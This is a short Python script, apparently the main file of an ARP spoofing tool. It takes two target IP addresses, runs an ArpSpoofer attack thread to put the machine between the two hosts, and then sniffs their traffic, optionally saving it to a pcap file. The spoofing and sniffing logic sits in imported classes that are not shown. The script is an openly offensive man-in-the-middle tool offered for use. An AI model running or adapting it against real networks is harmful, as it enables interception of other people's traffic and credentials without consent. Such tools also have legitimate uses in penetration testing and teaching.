from classes.ArpSpoofer import ArpSpoofer
from classes.Sniffer import Sniffer
from functools import partial
import threading
import time
import sys
import signal


def spoof_and_sniff(t1_ip, t2_ip, wrpcap):
    spoofer = ArpSpoofer(t1_ip, t2_ip)
    sniffer = Sniffer(t1_ip, t2_ip, write_to_pcap=wrpcap)

    e = threading.Event()

    # Initialize signal to finish all threads on Ctrl + C #
    signal.signal(signal.SIGINT, partial(signal_handler, e))

    print("#### Started Spoofing... #### ")
    thr1 = threading.Thread(target=spoofer.attack, args=(), kwargs={'event': e})
    thr1.start()
    time.sleep(2)

    print("#### Started Sniffing... ####")
    thr2 = threading.Thread(target=sniffer.sniff_packets, args=(), kwargs={'event': e})
    thr2.start()

    thr1.join()
    thr2.join()

    print("#### FINISHED GRACEFULLY and MAC SPOOF UNDONE... ####")
    sys.exit(0)


def signal_handler(event, signal, frame):
    event.set()


def is_ipv4(s):
    pieces = s.split('.')
    if len(pieces) != 4:
        return False
    try:
        return all(0 <= int(p) < 256 for p in pieces)
    except ValueError:
        return False


if __name__ == '__main__':
    if len(sys.argv) > 2 and is_ipv4(sys.argv[1]) and is_ipv4(sys.argv[2]):
        target_1_ip = sys.argv[1]
        target_2_ip = sys.argv[2]

        if len(sys.argv) > 3:
            write_to_pcap_file = (sys.argv[3] == "pcap")
        else:
            write_to_pcap_file = False

        spoof_and_sniff(target_1_ip, target_2_ip, write_to_pcap_file)
    else:
        print("Wrong parameters!")
